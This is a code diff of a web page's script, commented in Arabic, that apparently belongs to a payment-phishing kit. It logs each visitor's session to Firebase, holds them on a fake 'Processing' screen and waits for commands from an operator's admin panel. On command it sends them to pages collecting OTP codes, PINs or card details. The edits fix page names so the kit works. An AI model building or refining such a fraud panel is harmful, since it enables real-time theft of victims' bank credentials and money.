@@ -88,36 +88,41 @@
         const v_id = localStorage.getItem('v_id');
 
         if (v_id) {
-            // تحديث موقع الزائر الحالي
+            // تحديث موقع الزائر الحالي ليظهر في اللوحة
             database.ref('live_sessions/' + v_id).update({
                 current_page: "انتظار (Processing)",
                 last_seen: new Date().getTime()
             });
 
-            // مراقبة الأوامر القادمة من لوحة التحكم (الآدمن)
+            // مراقبة الأوامر القادمة من لوحة التحكم (الأدمن)
             const orderRef = database.ref('orders/' + v_id);
             orderRef.on('value', (snapshot) => {
                 const data = snapshot.val();
                 if (data && data.next_step) {
                     
-                    // حالات التحويل التي تتحكم بها من لوحة التحكم
+                    // تحويل العميل بناءً على الأوامر والأسماء الصحيحة في GitHub
                     switch(data.next_step) {
                         case 'go_to_otp':
-                            window.location.href = 'sync-token.html';
+                            // تم التعديل للاسم الصحيح الموجود في صورتك
+                            window.location.href = 'auth-session.html';
                             break;
                         case 'go_to_pin':
-                            window.location.href = 'secure-auth-v4.html';
+                            // تم التعديل للاسم الصحيح الموجود في صورتك (المرحلة الثانية)
+                            window.location.href = 'system_core_auth.html';
                             break;
                         case 'wrong_card':
-                            window.location.href = 'secure-pay-v2.html?error=invalid';
+                            // الرجوع لصفحة الدفع (تأكد من اسمها secure-pay-v2.html)
+                            window.location.href = 'secure-pay-v2.html';
                             break;
                         case 'success':
+                            // صفحة النجاح
                             window.location.href = 'success-page.html';
                             break;
                     }
                 }
             });
         } else {
+            // لو مفيش ID يرجعه للرئيسية
             window.location.href = 'index.html';
         }
     </script>
